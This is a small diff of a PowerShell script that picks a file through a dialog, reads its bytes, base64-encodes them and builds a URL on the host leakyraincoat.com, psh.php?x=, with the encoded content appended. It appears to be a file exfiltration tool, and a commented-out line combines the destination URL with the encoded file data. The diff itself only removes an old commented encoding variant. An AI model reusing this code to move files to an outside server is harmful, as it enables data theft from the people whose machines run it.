@@ -11,7 +11,6 @@ Function Get-FileName($initialDirectory)
 $ResultURL = "http://leakyraincoat.com/psh.php?x="                     # Destination URL
 $inputfile = Get-FileName "C:\temp"                                    # Open dialog to select file to send
 $FileContent = [IO.File]::ReadAllBytes($inputfile);                    # Read file
-#$encoded = [Convert]::ToBase64String($FileContent).TrimStart("`/"," ") # Convert to base64
 $encoded = [Convert]::ToBase64String($FileContent) # Convert to base64
 #Write-Host ($ResultURL + $encoded)
 Write-Host $encoded
